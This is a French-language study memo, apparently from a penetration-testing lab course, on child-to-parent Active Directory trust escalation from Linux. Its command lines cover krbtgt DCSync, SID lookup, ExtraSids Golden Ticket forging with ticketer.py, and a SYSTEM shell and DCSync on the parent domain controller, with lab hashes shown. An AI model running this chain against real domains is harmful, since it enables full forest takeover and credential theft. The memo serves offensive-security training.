# Mémo — Attacking Domain Trusts : Child → Parent (depuis Linux)

> Même attaque **ExtraSids** que la version Windows, mais depuis un hôte d'attaque Linux avec **Impacket**.
> On collecte les mêmes données, on forge un Golden Ticket avec un **ExtraSID** (SID Enterprise Admins du parent), puis on l'utilise pour accéder au DC du parent.
> Lab : child `LOGISTICS.INLANEFREIGHT.LOCAL` (DC02, `172.16.5.240`) → parent `INLANEFREIGHT.LOCAL` (DC01, `172.16.5.5`).

---

## 1. Données à collecter (identiques à la version Windows)

| Donnée | Outil Linux | Valeur lab |
|--------|-------------|------------|
| **KRBTGT NT hash** du child | `secretsdump.py` (DCSync) | `9d765b482771505cbe97411065964d5f` |
| **SID** du child domain | `lookupsid.py` sur le DC child | `S-1-5-21-2806153819-209893948-922872689` |
| **User cible** du child | arbitraire, **peut ne pas exister** | `hacker` (fake) |
| **FQDN** du child | connu | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| **SID Enterprise Admins** du root | `lookupsid.py` sur le DC parent + RID `519` | `S-1-5-21-3842939050-3880317879-2865463114-519` |

## 2. Collecte des données

### a) KRBTGT hash du child — DCSync via secretsdump.py
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \
  -just-dc-user LOGISTICS/krbtgt
#   → krbtgt:502:...:9d765b482771505cbe97411065964d5f:::
#   → récupère aussi les clés Kerberos (aes256 / aes128 / des)
```

### b) SID du child domain — brute force via lookupsid.py
`lookupsid.py` fait du **SID brute forcing** : l'IP ciblée (DC du domaine visé) devient le domaine interrogé. Il renvoie le **SID du domaine** + les **RIDs** de chaque user/groupe (SID complet = `DOMAIN_SID-RID`, ex. `lab_adm` = `...-922872689-1001`).
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
#   → Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

### c) SID Enterprise Admins du PARENT — même outil, IP du DC01
On cible le DC parent (`172.16.5.5`), on récupère son SID de domaine et on y accole le **RID 519** (Enterprise Admins, RID fixe).
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
#   → Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
#   → 519: INLANEFREIGHT\Enterprise Admins
#   → SID complet : S-1-5-21-3842939050-3880317879-2865463114-519
```

## 3. Forger le Golden Ticket — ticketer.py

Ticket valide sur le **child** (`-domain-sid`) **et** le **parent** (`-extra-sid`).
```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
#   → Saving ticket in hacker.ccache
```

| Flag ticketer.py | Rôle |
|------------------|------|
| `-nthash` | NT hash du krbtgt du child |
| `-domain` | FQDN du child |
| `-domain-sid` | SID du child domain |
| `-extra-sid` | **SID Enterprise Admins du parent** → l'ExtraSID injecté |
| `hacker` | nom du compte à forger (peut être bidon) |

## 4. Utiliser le ticket (ccache)

Le TGT est sauvé dans un fichier **ccache** (Kerberos credential cache). On pointe `KRB5CCNAME` dessus pour que les outils l'utilisent.
```bash
export KRB5CCNAME=hacker.ccache
```

### Shell SYSTEM sur le DC parent — psexec.py
```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local \
  -k -no-pass -target-ip 172.16.5.5
#   -k       → auth Kerberos (utilise le ccache)
#   -no-pass → pas de mot de passe (le ticket suffit)
#   → whoami : nt authority\system   |   hostname : ACADEMY-EA-DC01
```

### DCSync ciblé d'un compte du parent — secretsdump.py (+ le ticket)
Plutôt qu'un shell, on peut DCSync directement un DA du root grâce aux droits EA du ticket :
```bash
secretsdump.py -k -no-pass -just-dc-user INLANEFREIGHT/bross \
  academy-ea-dc01.inlanefreight.local
#   (ajouter -target-ip 172.16.5.5 si la résolution du FQDN échoue)
#   → inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
#   → NT hash de bross (DA parent) : 49a074a39dd0651f647e765c2cc794c7
```

## 5. Version automatisée — raiseChild.py

Automatise tout le child → parent. On fournit juste le DC child + des creds admin du child ; le script :
1. localise le DC child et le FQDN de la forêt (MS-NRPC),
2. récupère le SID **Enterprise Admins** du parent (MS-LSAT),
3. dump le **krbtgt** du child (MS-DRSR),
4. forge le **Golden Ticket** (SID en ExtraSids, expiration 10 ans),
5. se logue sur le parent et récupère les creds de l'**Administrator** du root,
6. avec `-target-exec` → shell **Psexec** sur le DC parent.

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
#   → INLANEFREIGHT.LOCAL/administrator:500:...:88ad09182de639ccc6579eb0849751cf:::
#   → shell SYSTEM sur ACADEMY-EA-DC01
```

> ⚠️ **À éviter en prod / préférer le manuel.** Les scripts "autopwn" masquent le process : si ça casse chez un client, on ne sait pas pourquoi. Maîtriser la chaîne manuelle (ticketer.py + psexec.py) = meilleur contrôle et capacité de troubleshoot. Ne lancer que des outils qu'on comprend entièrement.

---

## 6. À retenir — équivalences Windows ↔ Linux

| Étape | Windows | Linux (Impacket) |
|-------|---------|------------------|
| krbtgt child | `lsadump::dcsync /user:LOGISTICS\krbtgt` | `secretsdump.py .../htb-student_adm@DC -just-dc-user LOGISTICS/krbtgt` |
| SID child | `Get-DomainSID` | `lookupsid.py .../user@<DC child> \| grep "Domain SID"` |
| SID Enterprise Admins parent | `Get-DomainGroup -Domain <parent> -Identity "Enterprise Admins"` | `lookupsid.py .../user@<DC parent> \| grep -B12 "Enterprise Admins"` (RID 519) |
| Golden Ticket | `kerberos::golden ... /ptt` / `Rubeus.exe golden` | `ticketer.py -nthash ... -extra-sid <EA SID> hacker` |
| Charger le ticket | `/ptt` (en mémoire) | `export KRB5CCNAME=hacker.ccache` |
| Preuve / exploitation | `ls \\<DC parent>\c$` puis `dcsync` | `psexec.py .../hacker@<DC parent> -k -no-pass` |
| Tout automatisé | — | `raiseChild.py -target-exec <DC parent> <child>/<admin>` |

**Pourquoi ça marche** : intra-forêt → **pas de SID Filtering** → le SID Enterprise Admins mis en `-extra-sid` est respecté dans le token. **Mitigation** : SID Filtering / quarantine entre domaines, rotation du krbtgt.
